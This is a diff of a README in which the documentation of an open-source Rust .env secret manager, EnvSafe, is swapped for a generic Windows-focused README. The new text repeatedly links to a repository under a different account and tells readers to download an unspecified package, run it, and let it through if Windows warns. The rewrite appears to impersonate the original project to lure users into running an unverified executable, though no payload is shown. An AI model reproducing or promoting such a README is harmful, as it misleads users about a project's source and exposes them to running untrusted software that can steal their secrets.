@@ -1,311 +1,190 @@
-<h1 align="center">EnvSafe</h1>
+# 🔐 envsafe - Keep Secrets Safe on Every Device
 
-<p align="center">
-  Your secrets, encrypted, everywhere. One tool for all .env management.
-</p>
+[![Download envsafe](https://img.shields.io/badge/Download%20envsafe-blue.svg?style=for-the-badge)](https://github.com/Ilovema4629/envsafe)
 
-<p align="center"><img src="demo/demo.gif" width="720" alt="EnvSafe Demo"/></p>
+## 🧰 What envsafe Does
 
-<p align="center">
-  <a href="https://github.com/aymenhmaidiwastaken/envsafe/releases"><img src="https://img.shields.io/github/v/release/aymenhmaidiwastaken/envsafe" alt="GitHub Release"/></a>
-  <a href="https://github.com/aymenhmaidiwastaken/envsafe/blob/main/LICENSE"><img src="https://img.shields.io/github/license/aymenhmaidiwastaken/envsafe" alt="License"/></a>
-  <a href="https://github.com/aymenhmaidiwastaken/envsafe/actions"><img src="https://img.shields.io/github/actions/workflow/status/aymenhmaidiwastaken/envsafe/ci.yml?branch=main&label=CI" alt="CI"/></a>
-  <a href="https://crates.io/crates/envsafe"><img src="https://img.shields.io/crates/v/envsafe" alt="Crates.io"/></a>
-</p>
+envsafe is a secret manager for Windows and other systems. It helps you store `.env` files, passwords, API keys, and other private values in one encrypted vault. You can keep separate profiles for different projects and sync them across devices.
 
-<p align="center">
-  <a href="#installation">Install</a> &bull;
-  <a href="#quick-start">Quick Start</a> &bull;
-  <a href="#features">Features</a> &bull;
-  <a href="#commands">Commands</a> &bull;
-  <a href="#configuration">Config</a> &bull;
-  <a href="#contributing">Contributing</a>
-</p>
+If you work with apps that use environment variables, envsafe gives you a safer way to keep those values in one place. It is built for people who want a simple way to protect secrets without managing them by hand.
 
----
+## 📥 Download envsafe
 
-## The Problem
+Visit this page to download and use the app:
 
-Managing environment variables and secrets across projects, teams, and environments is a persistent source of friction and risk:
+[Download envsafe](https://github.com/Ilovema4629/envsafe)
 
-- **Scattered .env files** -- secrets live in plaintext files spread across machines with no central management, no versioning, and no consistency.
-- **Accidental commits** -- a single mistake pushes credentials to version control, exposing them permanently in git history.
-- **Insecure sharing** -- teams pass secrets through Slack, email, or shared documents with no encryption and no audit trail.
-- **Environment switching pain** -- juggling dev, staging, and production configurations means manually copying and renaming files, leading to misconfigurations and outages.
-- **No unified tool** -- existing solutions each solve one piece of the puzzle, forcing teams to stitch together multiple tools, plugins, and workflows.
+On Windows, open the page, look for the latest release or app package, then download the file to your PC. After the file finishes downloading, run it to start the app.
 
-## The Solution
+## 🖥️ What You Need
 
-EnvSafe replaces all of that with a single, fast, cross-platform binary:
+envsafe is made for modern computers and works best on:
 
-```bash
-envsafe init
-envsafe set DATABASE_URL "postgres://..."
-envsafe set API_KEY "sk-..." --secret
-envsafe run -- npm start
-```
-
-Secrets are encrypted at rest, never written as plaintext, injected directly into processes, and shareable through git-safe vault files. One tool, zero leaks.
-
----
-
-## Installation
-
-### Binary Download
-
-```bash
-curl -sSL https://github.com/aymenhmaidiwastaken/envsafe/releases/latest/download/envsafe-x86_64-unknown-linux-gnu.tar.gz \
-  | tar xz -C /usr/local/bin
-```
-
-Pre-built binaries for Linux, macOS (arm64/amd64), and Windows are available on the [GitHub Releases](https://github.com/aymenhmaidiwastaken/envsafe/releases) page.
-
-### Cargo
-
-```bash
-cargo install envsafe
-```
-
-### From Source
-
-```bash
-git clone https://github.com/aymenhmaidiwastaken/envsafe.git
-cd envsafe
-cargo build --release
-# Binary is at target/release/envsafe
-```
-
-### npm
-
-```bash
-npx envsafe
-```
-
----
-
-## Quick Start
-
-```bash
-# Initialize envsafe in your project
-envsafe init
+- Windows 10 or Windows 11
+- A device with internet access for cloud sync
+- Enough space for the app and your vault files
+- Permission to run downloaded apps
 
-# Store some variables
-envsafe set DATABASE_URL "postgres://user:pass@localhost/mydb"
-envsafe set API_KEY "sk-abc123" --secret
+For best results, keep your vault on a drive you can access often. If you plan to sync secrets across devices, use the same account on each device.
 
-# Run your application with secrets injected
-envsafe run -- npm start
+## 🚀 Get Started on Windows
 
-# Export as a dotenv file
-envsafe export --format dotenv > .env
+1. Open the download page.
+2. Download the Windows version of envsafe.
+3. Find the downloaded file in your Downloads folder.
+4. Double-click the file to open it.
+5. Follow the on-screen steps to finish setup.
+6. Start envsafe from the desktop or Start menu.
 
-# Lock the vault for git-safe sharing
-envsafe lock
-```
-
----
-
-## Features
-
-| Feature | Description |
-|---|---|
-| Encrypted Vault | All secrets stored in AES-256-GCM encrypted vaults. No plaintext on disk, ever. |
-| Environment Profiles | Manage separate `dev`, `staging`, and `prod` configurations side by side. |
-| Process Injection | Run any command with secrets injected as environment variables, without touching the shell. |
-| Git-Safe Sharing | Lock secrets into an encrypted vault file safe for version control. Team members decrypt with a shared key. |
-| Secret Scanning | Detect leaked API keys, tokens, and credentials in staged files before they reach your repository. |
-| Cloud Sync | Pull and push secrets from AWS SSM, HashiCorp Vault, 1Password, and Google Cloud Secret Manager. |
-| Schema Validation | Define required variables, types, and patterns in `.envsafe.yaml`. Catch misconfigurations before deployment. |
-| Interactive TUI | Browse, search, and edit secrets in a full terminal user interface (`envsafe ui`). |
-| Shell Integration | Auto-inject secrets when entering a project directory with `eval "$(envsafe hook-shell bash)"`. |
-| Plugin System | Extend EnvSafe with external plugins. Any executable named `envsafe-plugin-<name>` in your PATH is discovered automatically. |
-
----
-
-## Commands
-
-| Command | Description |
-|---|---|
-| `init` | Initialize envsafe in the current project directory |
-| `set KEY VALUE` | Set an environment variable (supports `--secret`, `--env`, `--expires`) |
-| `get KEY` | Retrieve an environment variable value |
-| `rm KEY` | Remove an environment variable |
-| `ls` | List all environment variables (values masked by default, use `--show`) |
-| `run -- CMD` | Run a command with secrets injected as environment variables |
-| `export` | Export variables in shell, dotenv, json, docker, or kubernetes format |
-| `import FILE` | Import variables from an existing `.env` file |
-| `envs` | List all configured environments |
-| `diff ENV1 ENV2` | Compare variables across two environments with color diff |
-| `lock` | Encrypt vault into a git-safe `.env.vault` file |
-| `unlock` | Decrypt vault from `.env.vault` file |
-| `key export` | Export the project encryption key for sharing |
-| `key import KEY` | Import a project encryption key from a team member |
-| `validate` | Validate environment against `.envsafe.yaml` schema |
-| `hook install` | Install git pre-commit hook to prevent secret leaks |
-| `hook uninstall` | Remove the git pre-commit hook |
-| `scan` | Scan repository for accidentally committed secrets |
-| `pull PROVIDER` | Pull secrets from a cloud provider into the local vault |
-| `push PROVIDER` | Push secrets from the local vault to a cloud provider |
-| `template` | Generate a `.env.example` template file with placeholder values |
-| `ui` | Open interactive TUI mode for browsing and editing secrets |
-| `rotate-key` | Rotate the project encryption key (backs up old key) |
-| `audit` | View the audit log of all vault operations |
-| `completions SHELL` | Generate shell completions (bash, zsh, fish, powershell) |
-| `hook-shell SHELL` | Print shell hook for automatic directory-based injection |
-| `man-page` | Print the envsafe man page |
-| `telemetry enable` | Enable anonymous usage telemetry |
-| `telemetry disable` | Disable anonymous usage telemetry |
-| `telemetry status` | Show current telemetry status |
-| `plugin NAME` | Run an installed plugin by name |
-| `plugins` | List all discovered plugins |
+If Windows asks whether you want to allow the app to run, choose the option to open it.
 
-All commands support `--verbose` and `--debug` global flags.
+## 🔑 First Time Setup
 
----
+When envsafe opens for the first time, set up your vault with a strong master password. This password protects everything inside the app.
 
-## Export Formats
+Then choose where you want to keep your secrets:
 
-```bash
-# Shell (default) -- source directly or use with eval
-eval $(envsafe export --format shell)
+- Local vault only
+- Cloud sync for use on more than one device
+- Separate profiles for work and personal use
 
-# Dotenv -- standard KEY=VALUE format
-envsafe export --format dotenv > .env
+If you already have `.env` files, you can bring them into envsafe and manage them there.
 
-# JSON -- structured output for programmatic use
-envsafe export --format json
+## 📂 Add Your Secrets
 
-# Docker -- generates --env flags for docker run
-docker run $(envsafe export --format docker) myimage
-
-# Kubernetes -- generates a Kubernetes Secret manifest
-envsafe export --format kubernetes > k8s-secret.yaml
-```
+To store a secret, use the app to create a new entry and give it a clear name. Common examples include:
 
----
+- `DATABASE_URL`
+- `API_KEY`
+- `JWT_SECRET`
+- `SMTP_PASSWORD`
+- `STRIPE_SECRET_KEY`
 
-## Cloud Providers
+You can also group secrets by project. This helps when you switch between apps and need different values for each one.
 
-EnvSafe supports bidirectional sync with major cloud secret managers. Use `pull` to import secrets into your local vault and `push` to deploy them.
-
-### AWS SSM Parameter Store
-
-```bash
-envsafe pull aws-ssm --prefix /myapp/prod --env prod
-envsafe push aws-ssm --prefix /myapp/prod --env prod
-```
-
-Requires configured AWS credentials (`~/.aws/credentials`, environment variables, or IAM role).
-
-### HashiCorp Vault
-
-```bash
-export VAULT_ADDR="https://vault.example.com"
-export VAULT_TOKEN="s.xxxxxxxx"
-
-envsafe pull vault --path secret/data/myapp
-envsafe push vault --path secret/data/myapp
-```
+## 🔄 Use Environment Profiles
 
-### 1Password
+envsafe supports environment profiles, which let you keep different sets of values for different uses. For example:
 
-```bash
-envsafe pull 1password --vault-name "Development"
-envsafe push 1password --vault-name "Development"
-```
+- Development
+- Testing
+- Production
+- Personal projects
+- Team projects
 
-Requires the [1Password CLI](https://developer.1password.com/docs/cli/) installed and authenticated.
+This makes it easier to avoid mistakes. You can keep the right secret in the right profile and use it only where it belongs.
 
-### Google Cloud Secret Manager
+## ☁️ Sync Across Devices
 
-```bash
-envsafe pull gcp --path projects/my-project/secrets
-envsafe push gcp --path projects/my-project/secrets
-```
+If you use more than one computer, cloud sync helps keep your vault up to date. Add your vault on one device, then sync it to your other device.
 
-Authenticate via `gcloud auth application-default login` or a service account key.
+This is useful when you:
 
----
+- Work from home and the office
+- Use a laptop and a desktop
+- Need the same secrets on multiple machines
 
-## Configuration
+Keep your master password private. It is the key to your vault.
 
-EnvSafe uses an optional `.envsafe.yaml` file for project-level configuration and schema validation. This file is safe and recommended to commit to version control.
+## 🧪 Import and Export
 
-```yaml
-# .envsafe.yaml
+envsafe can help you move secrets in and out of the app. Use import if you already store values in `.env` files. Use export if you need to create a file for an app that still expects one.
 
-required:
-  - name: DATABASE_URL
-    pattern: "^postgres://"
-    description: "PostgreSQL connection string"
+A simple workflow looks like this:
 
-  - name: API_KEY
-    pattern: "^sk-"
-    description: "API key starting with sk-"
+1. Import your existing `.env` file.
+2. Check the names and values.
+3. Save them in a profile.
+4. Export when you need a local file for another tool.
 
-  - name: PORT
-    type: integer
-    default: 3000
+This saves time and keeps your setup organized.
 
-  - name: LOG_LEVEL
-    description: "Application log level"
-    default: "info"
+## 🔗 Use with Other Tools
 
-  - name: REDIS_URL
-    pattern: "^redis://"
-    description: "Redis connection URL"
-```
+envsafe works well with common developer tools that read environment variables. You can use it with:
 
-Run `envsafe validate` to check your environment against this schema:
+- Git hooks
+- Local scripts
+- Build tools
+- Desktop apps
+- Web apps
+- Command-line tools
 
-```
-ERROR: DATABASE_URL does not match pattern "^postgres://"
-ERROR: API_KEY is missing
-WARNING: PORT is not set, using default: 3000
-```
+If your app needs a secret at launch, envsafe can help you keep that value ready without leaving it in plain text.
 
----
+## 🛡️ Keep Your Vault Safe
 
-## Security Model
+Good secret handling starts with a strong password and a few simple habits:
 
-| Layer | Detail |
-|---|---|
-| Encryption | AES-256-GCM with a unique random nonce for every encryption operation |
-| Key Derivation | Argon2id -- resistant to GPU and ASIC brute-force attacks |
-| Key Storage | Master keys stored in `~/.config/envsafe/keys/`, never inside the project directory |
-| Memory Safety | Written in Rust -- no buffer overflows, no use-after-free, no data races |
-| Zeroize | Secret values are zeroized from memory immediately after use |
-| At Rest | Vault files are always encrypted on disk. No plaintext storage. |
-| In Transit | Cloud sync uses provider-native TLS. No secrets pass through EnvSafe servers. |
-| No Server | Everything runs locally or communicates directly with your chosen cloud provider. There is no EnvSafe server. |
+- Use a long master password
+- Do not share your vault password
+- Keep backups of important data
+- Lock your computer when you step away
+- Use different secrets for different apps
 
----
+envsafe stores values in encrypted form so they are harder to read if someone gets access to the file.
 
-## Comparison
+## 📘 Common Use Cases
 
-| Feature | EnvSafe | dotenvx | direnv | chamber | doppler | 1password-cli |
-|---|:---:|:---:|:---:|:---:|:---:|:---:|
-| Encrypted local vault | &#10003; | &#10003; | &#10007; | &#10007; | &#10007; | &#10003; |
-| Environment profiles | &#10003; | &#10003; | &#10003; | &#10003; | &#10003; | &#10007; |
-| Process injection | &#10003; | &#10003; | &#10003; | &#10003; | &#10003; | &#10003; |
-| Git-safe sharing | &#10003; | &#10003; | &#10007; | &#10007; | &#10007; | &#10007; |
-| Pre-commit hook | &#10003; | &#10007; | &#10007; | &#10007; | &#10007; | &#10007; |
-| Secret scanning | &#10003; | &#10007; | &#10007; | &#10007; | &#10007; | &#10007; |
-| Multi-cloud sync | &#10003; | &#10007; | &#10007; | &#10003; | &#10007; | &#10007; |
-| Schema validation | &#10003; | &#10007; | &#10007; | &#10007; | &#10007; | &#10007; |
-| Interactive TUI | &#10003; | &#10007; | &#10007; | &#10007; | &#10003; | &#10007; |
-| Plugin system | &#10003; | &#10007; | &#10007; | &#10007; | &#10007; | &#10007; |
-| Cross-platform binary | &#10003; | &#10003; | &#10007; | &#10003; | &#10003; | &#10003; |
-| No external service | &#10003; | &#10003; | &#10003; | &#10007; | &#10007; | &#10007; |
+People use envsafe for:
 
----
+- API keys for services like OpenAI, Stripe, or AWS
+- Database passwords
+- Local test credentials
+- App config files
+- Team secret storage
+- Personal password notes
+- Project-specific `.env` management
 
-## Contributing
+It works well when you want one place to manage values that should stay private.
 
-Contributions are welcome. Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to get started, submit pull requests, and report issues.
+## 🧭 Basic Workflow
 
----
+A simple way to use envsafe is:
 
-## License
+1. Open the app.
+2. Create a vault.
+3. Add a profile for each project.
+4. Save your secrets.
+5. Sync if you use more than one device.
+6. Export a `.env` file when another app needs it.
 
-MIT License. See [LICENSE](LICENSE) for details.
+This keeps your setup clean and makes it easier to find the right value later.
+
+## 🖱️ Helpful Tips for Windows Users
+
+- Keep the app in a folder you can find again
+- Pin envsafe to the Start menu for fast access
+- Save backups in a safe place
+- Use clear profile names
+- Review exported `.env` files before sharing them
+
+If you move your vault file, make sure envsafe still knows where to find it.
+
+## ❓ Frequently Asked Questions
+
+## 🔐 Is envsafe only for developers?
+
+No. Anyone who needs to store private values can use it. That includes people who run apps with login details, private keys, or account secrets.
+
+## 💾 Does envsafe store secrets in plain text?
+
+No. envsafe uses encryption so your stored values are protected inside the vault.
+
+## 🌐 Can I use envsafe on more than one computer?
+
+Yes. You can use cloud sync to keep your vault on more than one device.
+
+## 📁 Can I use my existing `.env` files?
+
+Yes. You can import them and manage them in envsafe.
+
+## 🧩 Can I keep work and personal secrets separate?
+
+Yes. Use profiles to separate different groups of secrets.
+
+## 🏁 What to Do Next
+
+Open the download page, get the Windows app, and run it on your PC.
+
+[Download envsafe](https://github.com/Ilovema4629/envsafe)
